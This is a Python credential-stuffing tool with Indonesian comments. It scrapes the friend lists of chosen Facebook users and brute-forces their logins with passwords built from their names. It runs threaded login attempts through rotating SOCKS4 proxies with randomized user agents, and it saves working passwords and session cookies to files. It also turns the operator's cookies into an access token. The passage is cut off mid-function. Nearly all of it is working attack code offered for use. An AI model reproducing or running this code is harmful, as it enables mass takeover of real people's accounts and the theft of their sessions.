#    *--> Sc free 
#    *--> Note kalo udah enak jangan di premiumin
#----------[ INSTAL-MODULE ]----------#
import os

try:
	import bs4
	import rich
	import requests
	import stdiomask
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")

#----------[ IMPORT-MODULE ]----------#	
import sys,re,rich,bs4,time,json,urllib3,base64,random,datetime,requests
from bs4 import BeautifulSoup as sop
from rich.console import Console as sol
from rich import print as prints
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor as tred
from rich import pretty
from rich.tree import Tree
from rich.table import Table
from rich.text import Text as tekz
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.markdown import Markdown as mark

#----------[ GLOBAL-NAME ]----------#
pretty.install()
id2,uid=[],[]
proxxy,ugen,ugen2=[],[],[]
dump,id,akun=[],[],[]
method,tokenku=[],[]
pwpluss,pwnya=[],[]
uadia,uamu=[],[]
loop,ok,cp=0,0,0
CON=sol()
console=Console()
ses=requests.Session()

#----------[ GET-PROXY ]----------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(proxy)
except Exception as e:
    proxy=open('.prox.txt','r').read().splitlines()
    	
#----------[ USER-CRACK ]----------#  
for Xr in range (10000):		
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 13)
	c='VOG-L'	
	d=random.randrange(20, 29)
	e='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=random.randrange(73,199)
	g='0'
	h=random.randrange(4200,5999)
	i=random.randrange(40,99)
	j='Mobile Safari/537.36 OPR/'
	k=random.randrange(50,99)
	l=random.randrange(0,9)
	m=random.randrange(2000,4999)
	n=random.randrange(50000,59999)
	uaku=f'{a} {b}; {c}{d}) {e}{f}.{g}.{h}.{i} {j}{k}.{l}.{m}.{n}'
	ugen.append(uaku)

#--------[ GENERATE-USER-AGENT ]----------#
for generateuseragent in range(10):
	a=random.randrange(1, 9)
	b=random.randrange(1, 9)
	c=random.randrange(7, 13)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
x = '\33[m' # DEFAULT
xx = '\x1b[1;93m' # KUNING
xxx = '\x1b[1;91m' # MERAH

#----------[ CONVERTER-BULAN ]----------#
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mai','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mai','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
	
#----------[ ERROR ]----------#	       
def help():
	print(f"{kun}╭────────────────────────────────────────────{x}")
	krek_cer(f"{xx}└──[{xxx} pilih yg bener bro :-(")
	login() 

#----------[ MACHINE-SUPPORT ]----------#		
def krek_cer(berjalan):
        for krek_cer in berjalan + "\n":sys.stdout.write(krek_cer);sys.stdout.flush();time.sleep(0.01)
                
#----------[ BACK ]----------#
def clear():
	os.system('clear')
def back():
	login()
	
#----------[ BANNER ]----------#
def banner():
  clear()
  print(f'''\t{mer}
  _________   _____ _____________________
 /   _____/  /     \\______   \_   _____/
 \_____  \  /  \ /  \|    |  _/|    __)  
 {puti}/        \/    Y    \    |   \|     \   
/_______  /\____|__  /______  /\___  /   
        \/         \/       \/     \/    
        {hijo} SIMPLE MULTI BRUTE FORCE''')
    	
#----------[ NGECEK COOKIES ]----------#
def login():
	try:
		token = open('.cyxieontoken.txt','r').read()
		cok = open('.cyxieoncokies.txt','r').read()
		tokenku.append(token)
		try:
			gass = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			krek = json.loads(gass.text)['id']
			fesbuk = json.loads(gass.text)['name']
			menu(krek,fesbuk)
		except KeyError:
			login_lagi()
		except requests.exceptions.ConnectionError:
			print(f"{kun}╭────────────────────────────────────────────{x}")
			krek_cer(f'{xx}└──[{xxx} Koneksi anda bermasalah :-( ');exit()
	except IOError:
		login_lagi()
		
#----------[ LOGIN-COOKIES ]----------#		
def login_lagi():
	try:
		os.system('clear');banner()
		print(f"{kun}╭────────────────────────────────────────────{x}")
		your_cookies = input(f'{kun}└──[{x} Input cookies {hijo}: ')
		with requests.Session() as r:
		              r.headers.update({'content-type': 'application/x-www-form-urlencoded',
		              })
		              data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
		              response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
		              code, user_code = response['code'], response['user_code']
		              verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		              r.headers.pop('content-type')
		              r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',
		              })
		              response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
		              if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
		               print(f"{kun}╭────────────────────────────────────────────{x}")
		               krek_cer(f"{xx}└──[{xxx} Cookies anda Invalid :-(", end='\r');time.sleep(3.5);print("                     ", end='\r')
		              else:
		                  action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '');fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1);jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1);data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,
		                  }
		                  r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',
		                  })
		                  response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
		                  if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
		                      r.headers.pop('content-type');r.headers.pop(
		                      'origin'
		                      
		                      )
		                      response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text;action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
		                      fb_dtsg = re.search(
		                      'name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
		                      jazoest = re.search(
		                      'name="jazoest" value="(\d+)"', str(response4)).group(1)
		                      scope = re.search(
		                      'name="scope" value="(.*?)"', str(response4)).group(1)
		                      display = re.search(
		                      'name="display" value="(.*?)"', str(response4)).group(1)
		                      user_code = re.search(
		                      'name="user_code" value="(.*?)"', str(response4)).group(1)
		                      logger_id = re.search(
		                      'name="logger_id" value="(.*?)"', str(response4)).group(1)
		                      auth_type = re.search(
		                      'name="auth_type" value="(.*?)"', str(response4)).group(1)
		                      encrypted_post_body = re.search(
		                      'name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
		                      return_format = re.search(
		                      'name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
		                      r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
		                      data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
		                      response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
		                      windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
		                      r.headers.pop('content-type');r.headers.pop(
		                      'origin'
		                      
		                      )
		                      r.headers.update({'referer': 'https://m.facebook.com/',})
		                      response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
		                      if 'Sukses!' in str(response6):
		                          r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
		                          response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
		                          access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
		                          ken = open(".cyxieontoken.txt", "w").write(access_token)
		                          cok = open(".cyxieoncokies.txt", "w").write(your_cookies)
		                          print(f"{kun}╭────────────────────────────────────────────{x}")
		                          print(f"{xx}└──[{hijo} Login berhasil jalankan ulang pythonnya");exit()
		                      else:
		                              print(f"{kun}╭────────────────────────────────────────────{x}")
		                              krek_cer(f"{xx}└──[{xxx} Login gagal cek tumbal lo ngab :-(")
	except Exception as e:
	       print(f"{kun}╭────────────────────────────────────────────{x}")
	       krek_cer(f"{xx}└──[{xxx} Login gagal cek tumbal lo ngab :-(");os.system('rm -rf .cyxieoncokies.txt && rm -rf .cyxieontoken.txt');print(e);time.sleep(3);back()
	
#----------[ BAGIAN-MENU ]----------#
def menu(id,name):
	try:
		token = open('.cyxieontoken.txt','r').read()
		cok = open('.cyxieoncokies.txt','r').read()
	except IOError:
		os.system('rm -rf .cyxieontoken.txt && rm -rf .cyxieoncokies.txt')
		print(f"{kun}╭────────────────────────────────────────────{x}")
		krek_cer("└──[{xxx} Cookies anda kedaluarsa :-(");time.sleep(3);login_lagi()
	os.system('clear')
	banner()
	print(f"{kun}╭────────────────────────────────────────────{x}")
	print(f'{xx}└──[{x} User  Id : {hijo}{name}{x}')
	print(f'{xx}└──[{x} Username : {hijo}{id}{x}')
	print(f"{kun}╭────────────────────────────────────────────{x}")
	print(f'{xx}└──[{x} 01. Crack publik{x}')
	print(f'{xx}└──[{x} 02. Crack email{x}')
	print(f'{xx}└──[{x} 03. Cek result{x}')
	print(f'{xx}└──[{x} 00. Hapus cokies{x}')
	print(f"{kun}╭────────────────────────────────────────────{x}")
	team_creakerz = input(f'{xx}└──[{x} Input : ')
	if team_creakerz in ['1','01']:
		nge_publik()
	elif team_creakerz in ['2','02']:
		nge_tumbal()
	elif team_creakerz in ['3','03']:
		krek_cer(f"{xx}└──[{x} dalam perbaiakan :-)")
		#cek_result()
	elif team_creakerz in ['0','00']:
		os.system('rm -rf .cyxieoncokies.txt && rm -rf .cyxieontoken.txt')
		print(f"{kun}╭────────────────────────────────────────────{x}")
		krek_cer(f'{xx}└──[{xxx} Suckses hapus cookies')
		back()
	else:
		help()

#----------[ CRACK-PUBLIK ]----------#
def nge_publik():
	try:
		token = open('.cyxieontoken.txt','r').read()
		cok = open('.cyxieoncokies.txt','r').read()
	except IOError:
		exit()
	try:
		print(f"{kun}╭────────────────────────────────────────────{x}")
		jum = int(input(f'{xx}└──[{x} Berapa target : '))
	except ValueError:
		help()
	if jum<1 or jum>100:
	    print(f"{kun}╭────────────────────────────────────────────")
	    krek_cer(f'{xx}└──[{xxx} Gagal dump ');back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		print(f"{kun}╭────────────────────────────────────────────{x}")
		kl = input(f"{xx}└──[{x} Idz target ke "+str(yz)+f"{hijo} : ")
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v1.0/'+userr+'?fields=friends.limit(5001)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f"{kun}╭────────────────────────────────────────────{x}")
			krek_cer(f'{xx}└──[{xxx} Sinyal problem')
	try:
		print(f"{kun}╭────────────────────────────────────────────{x}")
		print(f'{xx}└──[{x} Total Idz target {hijo}: '+str(len(id)))
		atur_ter()
	except requests.exceptions.ConnectionError:
		print(f"{kun}╭────────────────────────────────────────────{x}")
		krek_cer(f'{xx}└──[{xxx} Sinyal problem')
	except (KeyError,IOError):
		print(f"{kun}╭────────────────────────────────────────────{x}")
		krek_cer(f'{xx}└──[{xxx} Pertemanan tidak publik ')
		time.sleep(2)
		back()								
						
#----------[ MENU-IDZ ]----------#		
def atur_ter():
	print(f"{kun}╭────────────────────────────────────────────{x}")
	print(f'{xx}└──[{x} 01. Idz tua ')
	print(f'{xx}└──[{x} 02. Idz muda ')
	print(f'{xx}└──[{x} 03. Idz random ')
	print(f"{kun}╭────────────────────────────────────────────{x}")	
	krek_idz = input(f'{xx}└──[{x} Input Idz : ')
	if krek_idz in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif krek_idz in ['2','02']:
		muda=[]
		for gas_idz in sorted(id):
			muda.append(gas_idz)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif krek_idz in ['3','03']:
		for gas_idz in id:
			moga_old = random.randint(0,len(id2))
			id2.insert(moga_old,gas_idz)
	else:
		help()
		
#----------[ MENU-METODE ]----------#
	print(f"{kun}╭────────────────────────────────────────────{x}")
	print(f'{xx}└──[{x} 01. Validate ')
	print(f'{xx}└──[{x} 02. Asyinc ')
	print(f"{kun}╭────────────────────────────────────────────{x}")
	Url_nge_krek = input(f'{xx}└──[{x} Input url : ')
	if Url_nge_krek in ['1','01']:
		method.append('validate')
	elif Url_nge_krek in ['2','02']:
		method.append('reguler')
	else:
		method.append('validate')
		
	print(f"{kun}╭────────────────────────────────────────────{x}")
	print(f"{xx}└──[{x} Tambahkan pw manual (y/t)")	
	print(f"{kun}╭────────────────────────────────────────────{x}")
	pwtambah=input(f"{xx}└──[{x} Input : ")
	if pwtambah in ['y','Y']:
		pwpluss.append('ya')
		print(f"{kun}╭────────────────────────────────────────────{x}")	
		pwku=input(f"{xx}└──[{x} Input pw : ")
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
		
		print(f"{kun}╭────────────────────────────────────────────{x}")	
	
	print(f"{xx}└──[{x} Tambahkan ua manual (y/t)")
	print(f"{kun}╭────────────────────────────────────────────{x}")
	uatambah = input(f"{xx}└──[{x} Input : ")
	if uatambah in ['y','Ya','ya','Y']:
		uadia.append('ya')
		print(f"{kun}╭────────────────────────────────────────────{x}")
		kontol = input(f"{xx}└──[{x} Input ua : ")
		uamu.append(kontol)
	else:
		uadia.append('tidak')
	passwrdxdx()
	
#----------[ BAGIAN-WORDLIST ]----------#	
def passwrdxdx():
	global prog,des
	print(f"{kun}╭────────────────────────────────────────────{x}")
	print(f'{xx}└──[{x} MAINKAN MODE PESAWAT SETIAP 300 IDZ ')
	print(f'{kun}└────────────────────────────────────────────{x}\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'321')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'321')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'validate' in method:
				    pool.submit(metod1,idf,pwv)
				elif 'reguler' in method:
				    pool.submit(metod2,idf,pwv)
				else:
				    pool.submit(metod1,idf,pwv)
				    
	print(f"{kun}╭────────────────────────────────────────────{x}")
	print(f'{xx}└──[{x} OK {hijo}: %s'%(ok))
	print(f'{xx}└──[{x} CP {kun}: %s'%(cp))
	print(f"{kun}─────────────────────────────────────────────{x}")

#----------[ METODE-VALIDATE ]----------#	
def metod1(idf,pwv):
	global loop,ok,cp
	ses = requests.Session();rr = random.randint
	prog.update(des,description=f"{xx}Validate{x} Oke : {hijo}{ok} {x} Cpe : {xx}{cp}{xxx} Check : {x}{loop}/{len(id)} ");prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
	for pw in pwv:
		try:
			if 'ya' in uadia: ua = uamu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=145044622175352&kid_directed_site=0&app_id=145044622175352&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.0%2Fdialog%2Foauth%3Fclient_id%3D145044622175352%26scope%3Demail%26redirect_uri%3Dhttps%253A%252F%252Fstackauth.com%252Fauth%252Foauth2%252Ffacebook%26state%3D%257B%2522sid%2522%253A1%252C%2522st%2522%253A%252259%253A3%253A1b8%252C16%253Aa43dd3585f4ae630%252C10%253A1692622997%252C16%253A7de7e7ec1d8f171a%252C79edbc3ef341e29b3861166c6b886b50b7dd4ac560fa249cbd7effb00354f43a%2522%252C%2522cid%2522%253A%2522145044622175352%2522%252C%2522k%2522%253A%2522Facebook%2522%252C%2522ses%2522%253A%25227f8fa67817e941ac84bb9e27957d2b5f%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4cf5d108-0e7c-4776-aa60-a4acd2e15ead%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstackauth.com%2Fauth%2Foauth2%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522sid%2522%253A1%252C%2522st%2522%253A%252259%253A3%253A1b8%252C16%253Aa43dd3585f4ae630%252C10%253A1692622997%252C16%253A7de7e7ec1d8f171a%252C79edbc3ef341e29b3861166c6b886b50b7dd4ac560fa249cbd7effb00354f43a%2522%252C%2522cid%2522%253A%2522145044622175352%2522%252C%2522k%2522%253A%2522Facebook%2522%252C%2522ses%2522%253A%25227f8fa67817e941ac84bb9e27957d2b5f%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.0/dialog/oauth?client_id=145044622175352&scope=email&redirect_uri=https%3A%2F%2Fstackauth.com%2Fauth%2Foauth2%2Ffacebook&state=%7B%22sid%22%3A1%2C%22st%22%3A%2259%3A3%3A1b8%2C16%3Aa43dd3585f4ae630%2C10%3A1692622997%2C16%3A7de7e7ec1d8f171a%2C79edbc3ef341e29b3861166c6b886b50b7dd4ac560fa249cbd7effb00354f43a%22%2C%22cid%22%3A%22145044622175352%22%2C%22k%22%3A%22Facebook%22%2C%22ses%22%3A%227f8fa67817e941ac84bb9e27957d2b5f%22%7D&ret=login&fbapp_pres=0&logger_id=4cf5d108-0e7c-4776-aa60-a4acd2e15ead&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=145044622175352&kid_directed_site=0&app_id=145044622175352&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.0%2Fdialog%2Foauth%3Fclient_id%3D145044622175352%26scope%3Demail%26redirect_uri%3Dhttps%253A%252F%252Fstackauth.com%252Fauth%252Foauth2%252Ffacebook%26state%3D%257B%2522sid%2522%253A1%252C%2522st%2522%253A%252259%253A3%253A1b8%252C16%253Aa43dd3585f4ae630%252C10%253A1692622997%252C16%253A7de7e7ec1d8f171a%252C79edbc3ef341e29b3861166c6b886b50b7dd4ac560fa249cbd7effb00354f43a%2522%252C%2522cid%2522%253A%2522145044622175352%2522%252C%2522k%2522%253A%2522Facebook%2522%252C%2522ses%2522%253A%25227f8fa67817e941ac84bb9e27957d2b5f%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4cf5d108-0e7c-4776-aa60-a4acd2e15ead%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstackauth.com%2Fauth%2Foauth2%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522sid%2522%253A1%252C%2522st%2522%253A%252259%253A3%253A1b8%252C16%253Aa43dd3585f4ae630%252C10%253A1692622997%252C16%253A7de7e7ec1d8f171a%252C79edbc3ef341e29b3861166c6b886b50b7dd4ac560fa249cbd7effb00354f43a%2522%252C%2522cid%2522%253A%2522145044622175352%2522%252C%2522k%2522%253A%2522Facebook%2522%252C%2522ses%2522%253A%25227f8fa67817e941ac84bb9e27957d2b5f%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f"{xx}╭────────────────────────────╮{x}")
				tree = Tree('')
				tree.add(f"{xx}{idf}{x}").add(f"{xx}{pw}{x}")
				tree.add(f"{xxx}{ua}{x}")
				print(f"{xx}╰────────────────────────────╯{x}")
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{xx}╭────────────────────────────╮{x}")
				tree = Tree("")
				tree.add(f"\r{hijo}{idf}{x}").add(f"{hijo}{pw}{x}").add(f"{hijo}{kuki}{x}")
				tree.add(f"{xxx}{ua}{x}")
				print(f"{xx}╰────────────────────────────╯{x}")
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-ASYINC ]----------#	
def metod2(idf,pwv):
	global loop,ok,cp
	ses = requests.Session();rr = random.randint
	prog.update(des,description=f"{xx}Asyinc{x} Oke : {hijo}{ok} {x} Cpe : {xx}{cp}{xxx} Check : {x}{loop}/{len(id)} ");prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
	url = random.choice(["m.facebook.com"])
	#url = random.choice(["m.alpha.facebook.com"])
	ver = random.choice(["109","110","111","112",])
	for pw in pwv:
		try:
			if 'ya' in uadia: ua = uamu[0]
			urlk = ses.get(f'https://{url}/login.php?skip_api_login=1&api_key=123845574663321&kid_directed_site=0&app_id=123845574663321&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fauth_type%3Drerequest%26client_id%3D123845574663321%26redirect_uri%3Dhttps%253A%252F%252Fcodepen.io%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3Dbc70173dbe738ff1775082d7851aa49c9f7472e57dcafd17%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a6658e7-a097-4bc6-9a7c-75ffc730d004%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fcodepen.io%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dbc70173dbe738ff1775082d7851aa49c9f7472e57dcafd17%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			datane ={'lsd': re.search('name="lsd" value="(.*?)"',str(urlk.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(urlk.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(urlk.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(urlk.text)).group(1),
'try_number': '0', 
'unrecognized_tries': '0', 
'email': idf, 
'pass': pw, 
'prefill_contact_point': '', 
'prefill_source': '', 
'prefill_type': '', 
'first_prefill_source': '', 
'first_prefill_type': '', 
'had_cp_prefilled': 'true', 
'had_password_prefilled': 'false', 
'is_smart_lock': 'false', 
'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(urlk.text)).group(1),
'__dyn': "",
'__csr': "",
'__a': "",
'__user': "0",
'_fb_noscript': "true"}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in urlk.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			head={
			'Host': 'm.facebook.com',
'content-length': '2148',
'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
'sec-ch-ua-mobile': '?1',
'user-agent': ua,
'viewport-width': '450',
'content-type': 'application/x-www-form-urlencoded',
'x-fb-lsd': 'AVoCjEnXLQM',
'sec-ch-ua-platform-version': f'"{ver}"',
'x-asbd-id': '129477',
'dpr': f'{str(rr(1,9))}',
'sec-ch-ua-full-version-list': f'"Not:A-Brand";v="{str(rr(90,99))}.0.0.0", "Chromium";v="{str(rr(99,114))}.0.{str(rr(4999,5999))}.{str(rr(390,399))}"','sec-ch-ua-model': '"RMX1821"',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua-platform': '"Android"',
'accept': '*/*',
'origin': 'https://m.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
